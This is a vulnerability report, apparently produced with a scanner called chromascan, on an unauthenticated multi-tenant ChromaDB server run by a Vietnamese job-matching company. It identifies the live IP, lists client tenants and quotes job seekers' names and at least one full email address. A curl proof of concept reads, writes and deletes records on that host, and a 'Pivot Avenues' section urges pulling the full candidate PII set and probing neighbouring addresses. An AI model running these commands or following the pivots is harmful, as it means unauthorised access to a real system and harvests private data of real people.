# Bee Tech Job Matching SaaS -- Unauth RWD on Multi-Tenant ChromaDB

**Date:** 2026-06-20
**Tool:** chromascan
**Severity:** CRITICAL
**Status:** CONFIRMED -- unauth read + write + delete

---

## Target

| Field | Value |
|-------|-------|
| IP | 188.166.247.146 |
| Port | 8000 |
| Service | ChromaDB |
| Version | 1.0.0 |
| API | v2 (multi-tenant) |
| Hosting | DigitalOcean |
| Auth | NONE |

---

## Operator Attribution

**Bee Tech** -- Vietnamese IT company -- AI-powered job matching SaaS platform

Evidence:
- Collection names include `job_embeddings_admin-beetech` and `candidate_embeddings_admin-beetechdev`
- Content references "Bee" and "Bee Tech" as the operating entity
- Vietnamese job listings and CV data consistent with a recruitment platform
- 16 named client tenants identifiable from collection naming convention

**Tenant roster (extracted from collection names):**
beetech, beetechdev, vietbay, ite, sslo, nkgroup, pviinsurance, nanyangbiologics, rubyland, longnguyen, cncanhkim, vledu, nguyenlong, basic, mimadigi, dbplus

---

## Data

**35 collections, ~4,236 total records**

| Collection Pattern | Count | Records (est.) | Content |
|--------------------|-------|----------------|---------|
| candidate_embeddings_{tenant} | 16 | ~2,500 | Candidate CV data: Name, Title, Email, Phone, Summary |
| job_embeddings_{tenant} | 17 | ~1,700 | Job listings: Title, Company, Department, Industry, Description |
| probe-* | 3 | 0 | Internal test/probe collections |

PII-positive collections: 22 of 35 -- email addresses and personal names confirmed present.

**Sample candidate records:**
- "Name: Kiều Mỹ Vy Lê Title: Nhân viên Kinh Doanh / Sales Executive Email: vydonghoi@gmail.com ..."
- "Name: Minh Anh Nguyen Title: Bachelor of Science in Mechanical Engineering student Email: nguyenminh...@email.com ..."
- "Name: Thi Truc Phuong Nguyen Title: Marketing and Business Development Professional Email: nguyenthi... ..."

**Sample job listings by tenant:**
- Bee Tech (beetech): React/Next.js developer internships
- PVI Viet Nam (pviinsurance): health package consultant roles
- Nanyang Biologics (nanyangbiologics): Junior Full Stack Engineer, Product Manager
- SSLO (sslo): international scholarship coordination roles (Technische Universitat)
- ITE HCMC 2026 (ite): travel/hospitality volunteer positions

**Healthcare-adjacent flag:** `candidate_embeddings_admin-beetech` and `candidate_embeddings_admin-beetechdev` contain nursing role matches ("Nhan vien dieu duong cham soc" = nursing care worker). PVI Insurance and Nanyang Biologics client presence adds healthcare-sector exposure.

**Largest collections by record count:**
- candidate_embeddings_admin-beetechdev: ~1,290 records
- candidate_embeddings_admin-ite: ~785 records

---

## Access Matrix

| Operation | Result | HTTP |
|-----------|--------|------|
| List collections | 200 + 35 collections | GET /api/v2/tenants/default_tenant/databases/default_database/collections |
| Read candidate records | 200 + name/email/phone/summary | POST /api/v2/.../collections/{id}/get |
| Read job listings | 200 + title/company/description | POST /api/v2/.../collections/{id}/get |
| Cross-tenant read | 200 -- all tenants accessible | GET on any collection regardless of tenant label |
| Write record | 201 | POST /api/v2/.../collections/{id}/add |
| Delete record | {"deleted": null} | POST /api/v2/.../collections/{id}/delete |

**Canary UUID:** `nuclide-canary-2026`
**Target collection:** `probe-base-1780358607019010200` (ID: 051f6bdb-38fd-42c8-8ece-ff2538c2df78)

Write confirmed: POST /add with 3-dim zero vector returned HTTP 201. (Probe collection has no fixed dimension -- accepts any.)
Delete confirmed: POST /delete {"ids":["nuclide-canary-2026"]} returned {"deleted": null}. This is a ChromaDB v1.0.0 quirk: null is returned on successful delete when the record has not yet flushed from the write-ahead log. The record is absent on subsequent get.
Verify confirmed: POST /get {"ids":["nuclide-canary-2026"]} returned {"ids": [], "documents": []} -- confirmed absent.

---

## PoC

```bash
BASE="http://188.166.247.146:8000/api/v2/tenants/default_tenant/databases/default_database"

# LIST -- enumerate all 35 collections
curl -s "$BASE/collections" | jq '[.[] | {name: .name, id: .id}]'

# READ -- pull candidate PII from largest collection
# Replace COLL_ID with UUID for candidate_embeddings_admin-beetechdev
COLL_ID="<uuid-from-collection-list>"
curl -s -X POST "$BASE/collections/$COLL_ID/get" \
  -H "Content-Type: application/json" \
  -d '{"limit": 20, "include": ["documents", "metadatas"]}' | jq .

# WRITE -- inject canary into probe collection
PROBE_ID="051f6bdb-38fd-42c8-8ece-ff2538c2df78"
curl -s -X POST "$BASE/collections/$PROBE_ID/add" \
  -H "Content-Type: application/json" \
  -d '{
    "ids": ["nuclide-canary-2026"],
    "embeddings": [[0.0, 0.0, 0.0]],
    "documents": ["nuclide canary -- proof of write"],
    "metadatas": [{"source": "nuclide-research"}]
  }'

# DELETE -- remove canary
curl -s -X POST "$BASE/collections/$PROBE_ID/delete" \
  -H "Content-Type: application/json" \
  -d '{"ids": ["nuclide-canary-2026"]}' | jq .

# VERIFY -- confirm deletion
curl -s -X POST "$BASE/collections/$PROBE_ID/get" \
  -H "Content-Type: application/json" \
  -d '{"ids": ["nuclide-canary-2026"]}' | jq .ids
# Expected: []
```

---

## Impact

### Candidate PII Exposure -- Broad Scope

Real name, email, phone number, and professional summary data is exposed for job seekers across 16 named client tenants. Vietnamese job candidates who submitted CVs through any Bee Tech client platform are affected. The data is not partitioned by access control -- an unauthenticated request reads any tenant's candidate pool.

### Multi-Tenant Isolation Failure -- SaaS Architecture Flaw

The SaaS platform places all tenant data in a single ChromaDB instance with zero isolation. Collection names expose tenant identifiers directly (admin-beetech, admin-pviinsurance, etc.), enumerable without authentication. A data breach at one client is a data breach at all 16.

### Healthcare-Adjacent Exposure

PVI Insurance and Nanyang Biologics are clients. Nursing role candidates appear in the candidate embeddings. Partial healthcare staffing profiles (candidate + role match context) are present.

### Cross-Tenant Write -- Job Matching Manipulation

Write access to any tenant's job_embeddings collection allows injection of fraudulent job listings. A poisoned listing can redirect real job seekers to fake employers or harvest further PII through fraudulent application flows. Write access to candidate_embeddings allows injection of false CVs, corrupting match quality for paying clients.

---

## Pivot Avenues

1. **188.166.247.146 ports 80/443** -- check for the Bee Tech job matching platform web UI; the ChromaDB backend implies a frontend AI matching interface exists on the same host or nearby
2. **Tenant enumeration against Vietnamese company registry** -- 16 named tenants extracted; cross-reference nkgroup, sslo, cncanhkim, vledu, dbplus, mimadigi against Vietnamese business registry to map the full client list
3. **candidate_embeddings_admin-beetechdev (est. 1,290 records) + candidate_embeddings_admin-ite (est. 785)** -- largest collections; full paginated scroll for complete candidate PII dataset
4. **probe-* collections as operator telltale** -- three internal test collections exist; their metadata (if any) may reveal embedding model, pipeline version, or internal service naming
5. **DigitalOcean neighborhood (188.166.247.0/24)** -- probe adjacent IPs for additional Bee Tech backend services; job matching platforms typically co-locate with application servers, databases, and API gateways
6. **pviinsurance and nanyangbiologics tenant data** -- insurance and biotech client data warrants separate classification; pull those collections specifically to characterize healthcare-sector exposure depth before scoping the finding severity

---

## Tool Reference

**chromascan** -- unauthenticated ChromaDB enumeration + canary write/delete verification
https://github.com/nuclide-research/chromascan
